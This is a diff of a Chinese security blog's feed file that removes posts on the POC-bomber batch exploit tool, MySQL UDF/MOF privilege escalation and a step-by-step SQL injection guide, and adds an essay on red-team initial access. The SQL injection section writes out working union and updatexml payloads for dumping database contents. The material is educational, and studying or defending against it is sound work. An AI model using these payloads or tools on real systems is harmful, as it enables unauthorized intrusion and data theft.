     <content><![CDATA[<h2 id="PHP-是一种创建动态交互性站点的强有力的服务器端脚本语言"><a href="#PHP-是一种创建动态交互性站点的强有力的服务器端脚本语言" class="headerlink" title="PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言"></a>PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言</h2><h2 id="PHP-是什么？"><a href="#PHP-是什么？" class="headerlink" title="PHP 是什么？"></a>PHP 是什么？</h2><ul>
@@ -437,271 +705,72 @@
 ]]></content>
   </entry>
   <entry>
-    <title>🔥 POC-bomber</title>
-    <url>/2023/05/12/POC%E9%9B%86/</url>
-    <content><![CDATA[<p>🦄 <strong>POC bomber 是一款漏洞检测&#x2F;利用工具，旨在利用大量高危害漏洞的POC&#x2F;EXP快速获取目标服务器权限</strong></p>
-<p>本项目收集互联网各种危害性大的 RCE · 任意文件上传 · 反序列化 · sql注入 等高危害且能够获取到服务器核心权限的漏洞POC&#x2F;EXP，并集成在 POC bomber 武器库中，利用大量高危害POC对单个或多个目标进行模糊测试，以此在大量资产中快速获取发现脆弱性目标，获取目标服务器权限。适用场景包括但不仅限于以下:</p>
-<ol>
-<li>红蓝对抗或hvv中帮助红队在大量资产中快速找到突破口进入内网</li>
-<li>内网安全测试，横向移动</li>
-<li>利用新型0day对企业资产进行批量评估</li>
-</ol>
-<h2 id="📝-简介"><a href="#📝-简介" class="headerlink" title="📝 简介"></a>📝 简介</h2><p>POC bomber 的poc支持weblogic，tomcat，apache，jboss，nginx，struct2，thinkphp2x3x5x，spring，redis，jenkins，php语言漏洞，shiro，泛微OA，致远OA，通达OA等易受攻击组件的漏洞检测，支持调用dnslog平台检测无回显的rce(包括log4j2的检测)，支持单个目标检测和批量检测，程序采用高并发线程池，支持自定义导入poc&#x2F;exp，并能够生成漏洞报告<br>POC bomber默认使用验证模式进行poc的验证，如返回结果中attack的值为True时，可以加参数(–attack)进入攻击模式直接调用exp进行攻击(需要指定poc文件名)，达到一键getshell</p>
-<h2 id="😄-红队专版-RedTeam-3-0"><a href="#😄-红队专版-RedTeam-3-0" class="headerlink" title="😄 红队专版-RedTeam 3.0"></a>😄 红队专版-RedTeam 3.0</h2><p>追求更快的速度？更稳定的框架？更低的资源占用？更高的检测效率？更多的poc&#x2F;exp集成利用？<br>尽请期待 POC-bomber RedTeam 3.0，目前仅限内部测试中，请持续关注项目更新。</p>
-<h2 id="💻-Screenshots"><a href="#💻-Screenshots" class="headerlink" title="💻 Screenshots"></a>💻 Screenshots</h2><h4 id="🏆-验证模式"><a href="#🏆-验证模式" class="headerlink" title="🏆 验证模式"></a>🏆 验证模式</h4><pre><code>    python3 pocbomber.py -u http://xxx.xxx
-</code></pre>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://user-images.githubusercontent.com/71172892/168099161-f46a54f7-562b-4ba5-a751-1d65492b17d9.png"
-                      alt="image"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://user-images.githubusercontent.com/71172892/147481630-f8b94566-572f-4d89-a874-dc01f5041377.png"
-                      alt="image"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://user-images.githubusercontent.com/71172892/148684886-98b0f1ff-76f5-48d3-8d2d-932635392a33.gif"
-                      alt="verify模试演示"
-                ></p>
-<h4 id="⚡️-攻击模式"><a href="#⚡️-攻击模式" class="headerlink" title="⚡️ 攻击模式"></a>⚡️ 攻击模式</h4><pre><code>    python3 pocbomber.py -u http://xxx.xxx --poc=&quot;thinkphp2_rce.py&quot; --attack
-</code></pre>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://user-images.githubusercontent.com/71172892/147629887-def9d18e-f6aa-466a-ab2c-2538752b82aa.png"
-                      alt="image"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://user-images.githubusercontent.com/71172892/148206720-86f77246-301c-481f-a16c-b36047f72d7c.png"
-                      alt="image"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://user-images.githubusercontent.com/71172892/148684097-67b59320-6758-458d-ac6b-ae219c327924.gif"
-                      alt="attack模式演示"
-                ></p>
-<h2 id="🔧-安装"><a href="#🔧-安装" class="headerlink" title="🔧 安装"></a>🔧 安装</h2><pre><code>  git clone https://github.com/tr0uble-mAker/POC-bomber.git            
-  cd POC-bomber
-  pip install -r requirements.txt
-</code></pre>
-<h2 id="🚀-用法"><a href="#🚀-用法" class="headerlink" title="🚀 用法"></a>🚀 用法</h2><pre><code>    查看用法:     python3 pocbomber.py
-    
-    模式:
-            获取poc/exp信息:   python3 pocbomber.py --show
-            单目标检测:        python3 pocbomber.py -u http://xxx.xxx.xx
-            批量检测:          python3 pocbomber.py -f url.txt -o report.txt 
-            指定poc检测:       python3 pocbomber.py -f url.txt --poc=&quot;thinkphp2_rce.py&quot;
-            exp攻击模式:       python3 pocbomber.py -u 目标url --poc=&quot;指定poc文件&quot; --attack
-    参数:
-            -u  --url      目标url
-            -f  --file     指定目标url文件   
-            -o  --output   指定生成报告的文件(默认不生成报告)
-            -p  --poc      指定单个或多个poc进行检测, 直接传入poc文件名, 多个poc用(,)分开
-            -t  --thread   指定线程池最大并发数量(默认30)
-            --show         展示poc/exp详细信息
-            --attack       使用poc文件中的exp进行攻击
-            --dnslog       使用dnslog平台检测无回显漏洞(默认不启用dnslog,可在配置文件中启用)
-</code></pre>
-<h2 id="🔆-配置文件"><a href="#🔆-配置文件" class="headerlink" title="🔆 配置文件"></a>🔆 配置文件</h2><pre><code>  /inc/config.py   
-</code></pre>
-<p>​          </p>
-<h2 id="⚠️-常见问题"><a href="#⚠️-常见问题" class="headerlink" title="⚠️ 常见问题"></a>⚠️ 常见问题</h2><ol>
-<li>程序不安装requirements.txt就可以直接运行，只依赖requests第三方库，其他库安装不上不影响程序运行，但有些poc会不能检测</li>
-<li>log4j2命令执行漏洞的检测：需要添加 –dnslog  参数 </li>
-<li>无回显漏洞检测默认使用 dnslog.cn 平台且默认关闭, 要开启需前往配置文件将 dnslog_flag 开关置为True  </li>
-<li>需要指定一个poc才能调用–attack攻击模式</li>
-</ol>
-<h2 id="📁-目录结构"><a href="#📁-目录结构" class="headerlink" title="📁 目录结构:"></a>📁 目录结构:</h2><pre><code>  +--------- poc_bomber.py (启动 POC-bomber)
-  | 
-  +--------- inc(存放支撑 POC-bomber 框架运行的核心文件)
-  |
-  \--------- pocs(POC存放列表)----------- framework(存放框架漏洞POC)
-                                  |
-                                  |------ middleware(存放中间件漏洞POC)
-                                  |
-                                  |------ ports(存放常见端口漏洞,主机服务漏洞POC)
-                                  |
-                                   \----- webs(存放常见web页面漏洞POC)
-</code></pre>
-<p>​      </p>
-<h2 id="📖-POC编写规则"><a href="#📖-POC编写规则" class="headerlink" title="📖 POC编写规则"></a>📖 POC编写规则</h2><p>POC bomber支持自定义编写poc<br>poc统一要求python3编写，具有verify和attack(非必须)两个函数分别进行验证和攻击,                     </p>
-<h4 id="👻-漏洞验证函数-verify-编写应该满足以下条件"><a href="#👻-漏洞验证函数-verify-编写应该满足以下条件" class="headerlink" title="👻 漏洞验证函数(verify)编写应该满足以下条件:"></a>👻 漏洞验证函数(verify)编写应该满足以下条件:</h4><ol>
-<li><p>函数名为 verify ， 参数接收目标url的参数           </p>
-</li>
-<li><p>函数的返回结果以字典的形式返回并且具有name和vulnerable两个键值，name说明漏洞名称，vulnerable通过True和False的状态表明漏洞是否存在</p>
-</li>
-<li><p>如果存在漏洞要将返回字典中vulnerable的值置为True, 并添加目标url, 漏洞利用相关网页等信息</p>
-</li>
-<li><p>用try方法尝试验证，使用request等发送数据包时要设置超时时间, 避免poc会卡死                              </p>
-<pre><code> def verify(url):                        
-     relsult = &#123;                                            
-         &#39;name&#39;: &#39;Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability&#39;,                          
-         &#39;vulnerable&#39;: False，
-         &#39;attack&#39;： False，        # 如果有exp支持attack模式将attack的值置为True
-     &#125;              
-     try:                    
-         ......        
-         (用任意方法检测漏洞)             
-         ......
-         if 存在漏洞:
-             relsult[&#39;vulnerable&#39;] = True     # 将relsult的vulnerable的值置为True
-             relsult[&#39;url&#39;] = url             # 返回验证的url
-             relust[&#39;xxxxx&#39;] = &#39;xxxxx&#39;        # 可以添加该漏洞相关来源等信息   
-             ......           
-             return relsult     # 将vulnerable值为True的relsult返回                   
-         else:  # 不存在漏洞           
-             return relsult    # 若不存在漏洞将vulnerable值为False的relsult返回
- 
-     execpt:
-         return relsult
-</code></pre>
-</li>
-</ol>
-<p>如果有exp可以编写 attack 函数作为exp攻击函数，</p>
-<h4 id="🎃-漏洞攻击函数-attack-编写应该满足以下条件："><a href="#🎃-漏洞攻击函数-attack-编写应该满足以下条件：" class="headerlink" title="🎃 漏洞攻击函数(attack)编写应该满足以下条件："></a>🎃 漏洞攻击函数(attack)编写应该满足以下条件：</h4><ol>
-<li><p>函数名为 attack ， 参数接收目标url的参数  </p>
-</li>
-<li><p>并在try中编写exp代码进行攻击, 可以与用户交互输入       </p>
-</li>
-<li><p>编写完成后将该漏洞的verify函数返回字典中attack值置为True </p>
-</li>
-<li><p>攻击成功后返回True，其他原因失败的话返回False即可        </p>
-<pre><code> def attack(url):    
-   try:            
-       ........................................            
-         攻击代码(执行命令或反弹shell上传木马等)             
-       ........................................
-       return True
-   except:               
-       return False    
-</code></pre>
-<p> ​</p>
-</li>
-</ol>
-<p>编写完成后的poc直接放入 &#x2F;pocs 目录下任意位置即可被递归调用!    </p>
-<p>项目持续更新中，欢迎各位师傅贡献poc共筑网络安全！<br>有问题欢迎issues留言: <a class="link"   href="https://github.com/tr0uble-mAker/POC-bomber/issues" >https://github.com/tr0uble-mAker/POC-bomber/issues <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>     </p>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。<br>在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。<br>如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。</p>
+    <title>外网打点</title>
+    <url>/2023/05/12/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/</url>
+    <content><![CDATA[<h2 id="一、打点的基本认识"><a href="#一、打点的基本认识" class="headerlink" title="一、打点的基本认识"></a>一、打点的基本认识</h2><p>做过红队的小伙伴，对打点一定不陌生，这是一项基本技能。</p>
+<p>所谓打点，就是拿到一台机器的 shell。</p>
+<p>打点的一般目的在于利用这台机器，做一个跳板，然后进入内网。</p>
+<p>通常给予充分时间的情况下，打点不是一件很难的事情，因为系统总会有漏洞，就算系统没有漏 洞，人也有漏洞，也可以进行钓鱼，甚至还可以近源，可以花钱买内鬼，一切都只是打点的时间和价格成本与打到点进内网的收益的核算问题，本质就是一道数学题。</p>
+<p>但是以在公司干活的普通员工视角出发，一般项目时间很紧，同时外部资源少，基本能用的东西就是自己的技术。</p>
+<p>对个体而言，这种条件下，个人技术成为了主导因素，也就是说，一个红队人员快速打点能力的强悍与否，成为了一个普通红队和优秀红队的差别所在。</p>
+<p>当然，这里有人会讲，那么有的地方可以给很多时间，或者说自己在实战中，在搞别的站的时候， 不是特定项目中，是有大把时间来进行渗透和攻击的，可以慢慢搞。</p>
+<p>主流的 ctf 赛事解题时间也只有 1-2 天，很多攻防项目也就是一周时间，src 中第一个挖到洞的才给钱，这是客观条件，对大家都是平等的。</p>
+<p>项目就只有几天，这就是游戏规则，是没有道理可讲的，所以还是不要找理由了，因为也没啥用。</p>
+<p>当然，从公司的角度出发，因为项目时间紧，而很大程度上，打点又是个体力活，不涉及太多技术，所以投入信息搜集的人越多，效果一般是更加好的。</p>
+<p>总而言之，打点本身就是一种遍历行为，被攻击的目标就好像一个被围墙保护的城堡，红队要做的事情就是围着围墙转来转去，敲敲打打，看看围墙哪里没修好，哪里空了一块，然后趁机溜进去， 这是一个体力劳动，尤其在面对很多目标的时候，是一项繁重的体力劳动，在下文中会详细解释为什么我反复强调这是一项体力劳动。</p>
+<h2 id="二、打点的基本方法"><a href="#二、打点的基本方法" class="headerlink" title="二、打点的基本方法"></a>二、打点的基本方法</h2><p>基本方法，无非就是信息搜集 –&gt; 找到脆弱资产 –&gt; 漏洞利用→getshell，说起来是很简单的。</p>
+<p>这其中最肝的一个部分，莫过于信息搜集了，纯体力活。</p>
+<p>当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall 等）来算 1w 道加减乘除题（大量的资产 域名子域名 c 段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。</p>
+<p>虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。</p>
+<p>1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司</p>
+<p>2、拿到这堆公司和子公司的名字→oneforall 来跑一遍→然后得到了一堆子域名</p>
+<p>3、拿到这堆子域名丢给 Eeyes 跑一遍→得到对应子域名对应的 ip 和 c 段信息</p>
+<p>4、将对应 ip 和 c 段丢给 fofa 和 fscan→fofa 能快速得到 c 段资产信息，fscan 能快速扫一遍，顺便帮你打一下常用漏洞</p>
+<p>5、如果你的运气足够好，这个时候 fscan 已经有漏洞爆出来了，可以直接去利用了（小概率事件），但是如果你的运气不好，就要看接下来的第 6 步</p>
+<p>6、刚刚 fofa 得到的资产看一眼，这里可以配合 ehole 的指纹识别来帮助快速筛选，通过筛选敏感资产，例如 shiro，fastjson 等直接能够反序列化 getshell 的资产（小概率事件），如果你的运气好，那么这个时候已经有漏洞了，可以直接利用了，如果你的运气不好，就要看接下来的第 7 步</p>
+<p>7、通过上面一番筛选，时间已经过去很久了，但是目前却毫无进展，其实心里有点郁闷，这个时候就不建议再搞了，先休息一下，调整下心态，不然后续的几天会大幅度降低工作效率，休息好了感觉又可以了，就看看下面的步骤 8 继续吧</p>
+<p>8、其实经过上面的一番筛选，web 这块的基本已经过完了，但是依旧还没有漏洞，说明这个系统平时自查搞的比较多，基本的高危漏洞修复已经完成了，如果是大型攻防演练，那就建议换个目标再用上面的方法轮一次，如果是就某家单位做的定向攻防，就继续看步骤 9 吧</p>
+<p>9、web 的过完了，虽然没有直接能够 rce 的系统，但是我们获得了很多形形色色的登录后台 \ 用户登录 \ 注册 \ 管理员登录等等等等交互类型的资产，这些资产虽然看起来没用，但是我这里要介绍一下攻防演练的三板斧漏洞，运气好的话，这些资产还是能够派上用场的</p>
+<p>三板斧其一 反序列化漏洞：这个不用多说，我最喜欢的漏洞，只要有了这个漏洞，基本一台机子的 shell 就拿到了，看到就眼睛放光，但是可遇不可求，遍地都是 shiro 的时代已经渐渐过去了。</p>
+<p>三板斧其二 文件上传：这个也是老熟人了，一般我会先看看是不是白名单，是白名单的话，就看看有没有文件包含之类的漏洞能组合利用下，如果是黑名单，就把文件上传的姿势对着上传点全部来一遍，看看有没有一个能中，如果能中，那就有了一个 shell（没路径连不上但是确实是 shell），虽然找上传路径也是一个拦路虎，但是至少比传不上去强。</p>
+<p>三板斧其三 sql 注入：这个更加老熟人了，注入之后，低权限，直接 gg，高权限，试试吧，看能不能上 shell。</p>
+<p>至于其他漏洞，攻防演练就那么几天时间，八成是用不上，建议直接放弃，就把上面三个玩精（仅仅就攻防项目来说）。</p>
+<p>10、对各种登录系统尝试弱口令 &#x2F;sql 注入攻击，弱口令能登进去后台就找上传点，sql 注入建议 xray+burp 来测，看到有戏的再上 sqlmap。</p>
+<p>还有一些信息搜集的方法，比如 fofa 搜关键字，title&#x3D;”单位名” 等，这种方法可以自行穿插灵活使用，有时候有奇效，有时候没啥效果，看个人造化了。</p>
+<p>还有些天选之人，直接一个弱口令登云桌面（horizon、vdi 等）然后拿 shell 的，这种属于天赐 shell，不在常规考虑范围之内，但也可以尝试。</p>
+<p>11、弱口令如果爆不出账号密码，就考虑上网盘 \github\sgk\ 泄露公开库搜对应人员的信息，看看好使不</p>
+<p>12、如果还是没有用，就可以开始看公众号 \app\ 小程序的信息</p>
+<p>13、如果还是没有用，就要开始用域传送 \ 备案号 \ip 反查网站 \ssl 证书 \ 用 google 来搜 c 段</p>
+<p>14、如果还是没有用，就用 dirmap\dirsearch 来对可疑的网站进行目录爆破，看看好使不</p>
+<p>15、如果还是没有用，还可以钓鱼，发邮件也是一个体力活</p>
+<p>16、如果还是没有用，拿上设备跟领导申请近源渗透吧</p>
+<p>列了这么多，我就是想说明，虽然信息搜集是一项很重要的工作，是开启后渗透的基础，但这项工作是体力活真的是不争的事实，因为他没有门槛，基本谁都能做，无非就是用工具对着一项项 checklist 不断的去尝试而已。</p>
+<p>因此通常意义上的快速打点，就是比谁先试完所有的 checklist，虽然目前绝大部分工作都是由工 具来完成，整个项目呈一个半自动化的流程，但是仍然架不住资产量的庞大，一个信息收集熟练的人，无非也就是流水线的工人而已，对着巨量的资产不断的用工具筛选而已。</p>
+<p>而一些高端打点技巧玩得好的人，例如电话钓鱼成功率很大的人，钓鱼邮件的撰写和钓鱼样本的开发做的很牛的人，在做这些事情之前，同样需要信息搜集，而能够玩高端技巧的人是不愿意来做信息搜集的，因为他们也是从小白阶段过来的，明白信息搜集这项繁重且技术含量低的工作完全可以找别人来做。</p>
+<p>从公司层面上来讲，要快速打点，就要投入更多的人。从个人层面上来讲，要快速打点，要忍受枯燥的打点过程，然后提升自己的工具使用速度，最好自己能够进行二次开发，把一些半自动化的步骤连接起来，优化现有的步骤，从而进一步提升效率。</p>
+<h2 id="三、打点的技术区分线"><a href="#三、打点的技术区分线" class="headerlink" title="三、打点的技术区分线"></a>三、打点的技术区分线</h2><p>很多时候，找到了一个脆弱资产，自己没利用成功，别人利用成功了，这是很普遍的现象。这就来到了打点的区分线，也就是漏洞利用上。</p>
+<p>利用不成功有很多的原因，比如一台机器明明出网，但是反弹 shell 怎么都弹不回来。比如一台机器能够反弹 shell，但是时不时就会断开。</p>
+<p>比如一台机器能够写入一个内存马，也能够连接上，但是一旦下载或者上传一些较大的文件，就会失败。</p>
+<p>比如一台机器，他能够执行命令，也能反弹 shell，连接也稳定，但是执行特定的命令，就会失败。</p>
+<p>这个时候，一个技术人员就脱离了苦力劳动的阶段，进入到了区分技术的时候了。区分一项工作是苦力劳动还是技术活其实很简单，看是不是谁都能做就行了。</p>
+<p>有的漏洞利用在实战中涉及了一些很原理的东西，对于渗透人员的基本功考察以及联想能力的考查是很强的，因此这个时候技术更好的人就可以凸显优势。</p>
+<p>举一个稍微极端的例子，那就是 ctf，做题是需要理解的，不会就是不会，多久都做不出来，信息搜集只要告诉了基本方法，基本都能做，只是熟练度有差别，信息搜集的效率有差别而已。</p>
+<p>就技术人员个体而言，单纯做一个熟练工，是很容易被淘汰的，应当花更多时间在技术的深化上， 建立自己的竞争壁垒。</p>
+<p>技术的深化，代码能力是基础，进一步对各个系统和漏洞原理的理解，是延申，不断的学习和突破，最后技术就会越来越好，也就会脱离信息搜集的循环，迈入更高的层面。</p>
+<p>不过做项目时候的信息搜集，那是公司项目，是不可避免的，公司花钱请人来就是干这个的。技术栈的突破和延申，是自己的事情。</p>
+<p>我觉得更优的解法就是先集中花一部分时间练习信息收集，然后配合自研的小工具把效率提上去， 练到了一定程度，做项目的时候信息搜集基本都能出东西了，公司这边能跟客户交差了，再把时间花到漏洞的突破和延申上。</p>
 ]]></content>
   </entry>
   <entry>
-    <title>关于我</title>
-    <url>/2023/04/17/hello-world/</url>
-    <content><![CDATA[<h1 id="Hi-Boys-and-Girls"><a href="#Hi-Boys-and-Girls" class="headerlink" title="Hi Boys and Girls!"></a>Hi Boys and Girls!</h1><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Screenshot_20230419_094457.jpg"
-                     
-                ></p>
-<p>​		你们好，我是Cream（笔名：顾彬彬），00后，就读于某某学院（hint：“老徐你要老婆不要?”），软件工程专业， 写Blog(博客)为了记录自己的学习历程，监督自己学习，督促自己成长，个人觉得只有自己写出来的知识才是学到手的东西，那才是自己的东西，现在已经入行网络信息安全行业了，现在还在沉淀阶段，以后也会深耕这个行业，并为之奉献，为中国的信息安全行业贡献自己的一份力量，抵制国外黑客入侵，保卫中国信息安全，从你我做起，从现在做起，识别钓鱼链接，不点击钓鱼链接，不给敌人可乘之机。</p>
-<h2 id="我的技能"><a href="#我的技能" class="headerlink" title="我的技能"></a>我的技能</h2><ul>
-<li>目前主攻的还是web安全方向，也会一些网络华为数通、安全设备的知识</li>
-<li>会渗透测试的基本流程，有实战漏扫经验、目前任职于一家国内等保测评公司</li>
-</ul>
-<h2 id="我的兴趣爱好"><a href="#我的兴趣爱好" class="headerlink" title="我的兴趣爱好"></a>我的兴趣爱好</h2><p>以下是一些少有的坚持下来的爱好：</p>
-<p>旅行：去过杭州西湖、成都春熙路、成都武侯祠、乐山大佛、湖南岳阳楼、上海东方明珠等等，但是还是想去西藏拉萨、故宫博物馆、北京八达岭长城，计划利用放假时间出去好好玩玩，记录美好时光<br>唱歌：有事没有机会唱一下，唱歌能够使人发泄不快乐的情绪，有利于保持好心情，哈哈哈<br>游戏：以前玩儿，现在很少玩了，以前主玩英雄联盟，但是操作跟不上了就放下了，现在也只玩玩手游联盟，陶冶情操罢了</p>
-<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/2029766.jpg"
-                     
-                ></p>
-<p>​		很高兴你能够访问我的Blog（博客），希望可以帮助到你，同时也非常高兴认识你！😊</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>MySQL提权</title>
-    <url>/2023/04/19/mysql%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>udf函数按照其运行模式可以分为单次调用型和聚集函数型两类，单词调用型能够针对数据库查询的每一行记录进行处理，聚集函数型用于处理 group by等聚集函数。</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>攻击者通过编写调用cmd或者shell的udf.dll文件，并且导入到一个指定的文件夹目录下，然后创建一个指向udf.dll的自定义函数，从而在数据库进行查询，而查询的结果则等价于在cmd或shell中执行命令。</p>
-<h3 id="存放位置"><a href="#存放位置" class="headerlink" title="存放位置"></a>存放位置</h3><p>Windows 2000操作系统需要导出udf.dll到c:\winnt\udf.dll；Windows 2003操作系统导出udf.dll到c:\Windows\udf.dll；</p>
-<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。</p>
-<p>当mysql账户权限是root，然后使用root权限去执行我们上传的mof，隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
-<h3 id="浏览器解码"><a href="#浏览器解码" class="headerlink" title="浏览器解码"></a>浏览器解码</h3><p>atob()</p>
-<p>​						</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>sql注入的注入攻略</title>
-    <url>/2023/04/19/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E6%94%BB%E7%95%A5/</url>
-    <content><![CDATA[<h1 id="联合注入攻略"><a href="#联合注入攻略" class="headerlink" title="联合注入攻略"></a>联合注入攻略</h1><h2 id="1、判断注入点（同时构造闭合符号）"><a href="#1、判断注入点（同时构造闭合符号）" class="headerlink" title="1、判断注入点（同时构造闭合符号）"></a>1、判断注入点（同时构造闭合符号）</h2><p>当输入?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;1 – q   &#x2F;&#x2F; 正常</p>
-<p>而输入?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;2 – q   &#x2F;&#x2F;报错</p>
-<p>则可证明是存在sql注入的。</p>
-<h2 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) order by 3 -- q   //若报错则字段数不为3，没报错则字段数就是3</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="3、判断输出点"><a href="#3、判断输出点" class="headerlink" title="3、判断输出点"></a>3、判断输出点</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,3 -- q   //这里注意前面的传参id要是不存在的，这样后面的select查询才能显现出来</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="4、爆出数据库名"><a href="#4、爆出数据库名" class="headerlink" title="4、爆出数据库名"></a>4、爆出数据库名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,database() -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="5、爆出表名"><a href="#5、爆出表名" class="headerlink" title="5、爆出表名"></a>5、爆出表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="6、爆字段名"><a href="#6、爆字段名" class="headerlink" title="6、爆字段名"></a>6、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- q		//查询表下的字段名</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="7、爆字段内的数据"><a href="#7、爆字段内的数据" class="headerlink" title="7、爆字段内的数据"></a>7、爆字段内的数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,group_concat(字段名),group_concat(字段名) from 要查的表名 -- q</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="布尔报错注入的注入攻略"><a href="#布尔报错注入的注入攻略" class="headerlink" title="布尔报错注入的注入攻略"></a>布尔报错注入的注入攻略</h1><p>报错注入是没有回显点位的，只能运用updatexml()函数来进行让他报错，从报错信息里面的到我们需要的信息。</p>
-<h2 id="1、构造闭合符号"><a href="#1、构造闭合符号" class="headerlink" title="1、构造闭合符号"></a>1、构造闭合符号</h2><p><strong>第一种情况</strong>：<strong>不是</strong>该闭合符</p>
-<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )   &#x2F;&#x2F;正常</p>
-<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) –+   &#x2F;&#x2F;正常</p>
-<p><strong>第二种情况</strong>：<strong>是</strong>该闭合符</p>
-<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )   &#x2F;&#x2F;报错</p>
-<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) –+   &#x2F;&#x2F;正常</p>
-<p>或者</p>
-<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;1(2) –+      &#x2F;&#x2F;变幻1&#x3D;1,1&#x3D;2来进行判断，如果是当前的构造符号，1&#x3D;2时应该报错，如果是正常则可以不是正确的构造符，通过变幻构造符好来判断出正常的构造符号</p>
-<h2 id="2、发现是报错注入，采用updataxml函数进行爆数据库名"><a href="#2、发现是报错注入，采用updataxml函数进行爆数据库名" class="headerlink" title="2、发现是报错注入，采用updataxml函数进行爆数据库名"></a>2、发现是报错注入，采用updataxml函数进行爆数据库名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,database()),1) -- q    //显示当前数据库的库名。Concat()时进行一个拼接的，把感叹号（！）和逗号后面的数据进行拼接。</span><br></pre></td></tr></table></figure></div>
-
